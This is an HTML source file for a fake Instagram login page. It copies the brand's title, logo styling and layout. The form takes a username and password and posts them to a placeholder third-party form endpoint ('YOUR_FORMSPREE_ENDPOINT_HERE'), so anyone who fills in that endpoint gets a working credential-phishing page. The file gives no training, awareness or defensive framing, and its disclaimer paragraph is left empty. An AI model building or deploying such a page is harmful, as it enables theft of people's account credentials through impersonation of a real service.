<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <style>
        /* CSS - The Design */
        body {
            background-color: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
        }

        .container {
            width: 350px;
            text-align: center;
        }

        .login-box {
            background-color: white;
            border: 1px solid #dbdbdb;
            padding: 20px 40px;
            margin-bottom: 10px;
        }

        .logo {
            font-size: 40px;
            margin: 20px 0;
            font-family: 'Palatino', serif; /* Simulating the brand font */
            font-style: italic;
            font-weight: bold;
        }

        input {
            width: 100%;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            padding: 9px 8px;
            margin-bottom: 8px;
            border-radius: 3px;
            box-sizing: border-box;
            font-size: 12px;
        }

        .login-btn {
            width: 100%;
            background-color: #0095f6;
            color: white;
            border: none;
            padding: 7px;
            border-radius: 8px;
            font-weight: 600;
            margin: 10px 0;
            cursor: pointer;
        }

        .login-btn:disabled {
            background-color: #b2dffc;
            cursor: not-allowed;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 15px 0;
        }

        .line { height: 1px; background: #dbdbdb; flex-grow: 1; }
        .divider p { margin: 0 15px; color: #8e8e8e; font-size: 13px; font-weight: 600; }

        .signup-box {
            background-color: white;
            border: 1px solid #dbdbdb;
            padding: 20px;
            font-size: 14px;
        }

        .signup-box a { color: #0095f6; text-decoration: none; font-weight: 600; }

        .disclaimer {
            font-size: 10px;
            color: #8e8e8e;
            margin-top: 20px;
            padding: 0 20px;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="login-box">
            <div class="logo">Instagram</div>
            
            <form action="YOUR_FORMSPREE_ENDPOINT_HERE" method="POST">
                <input type="text" name="username" placeholder="Phone number, username, or email" required>
                <input type="password" name="password" placeholder="Password" required>
                
                <button type="submit" class="login-btn">Log In</button>
                
                <div class="divider">
                    <div class="line"></div>
                    <p>OR</p>
                    <div class="line"></div>
                </div>

                <p style="color: #385185; font-size: 14px; font-weight: 600; cursor: pointer;">Log in with Facebook</p>
            </form>
        </div>

        <div class="signup-box">
            <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>

        <p class="disclaimer">
            
        </p>
    </div>

</body>
</html>
